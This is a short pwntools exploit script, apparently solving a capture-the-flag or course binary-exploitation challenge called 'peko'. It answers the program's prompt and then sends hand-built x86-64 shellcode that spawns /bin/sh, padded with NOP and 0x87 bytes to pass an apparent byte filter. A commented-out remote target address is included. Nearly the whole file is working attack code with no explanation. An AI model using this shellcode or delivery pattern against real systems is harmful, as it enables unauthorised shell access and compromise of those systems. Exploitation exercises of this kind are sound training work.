#!/usr/bin/python3
# -*- coding: UTF-8 -*-
from pwn import *

context.arch = 'amd64'
p = process('./peko')
#p = remote('140.115.59.7', 10002)
pause()

#addr = hexdump( p.recvuntil("\n")  )

magic = 0x401260
#shellcode = asm( shellcraft.sh() )
#shellcode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
shellcode = "\x55\x48\x89\xe5\x3c\x87\x48\x31\xd2\x90\x90\x90\x90\x90\x90\x3c\x87\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x87\xff\x48\xc1\xeb\x08\x53\x48\x89\xe7\x3c\x87\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x3c\x87\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x87\xff\xc9\xc3"


p.recvuntil(b"I think pekora is the best VTuber. Isn't it?\n")
p.send( b"yes" )
p.recvuntil( b"You will pass the course.\n" )

mask = ""
for i in range(0, 64):
    if( i % 11 == 5 ):
        mask += "\x87"
    else:
        mask += "\x90"

#print( m )
p.send( shellcode )

#p.recvuntil(b'\n')
#p.sendline( b"\x24" )
#p.sendline( b"/bin/sh" )

p.interactive()
p.close()

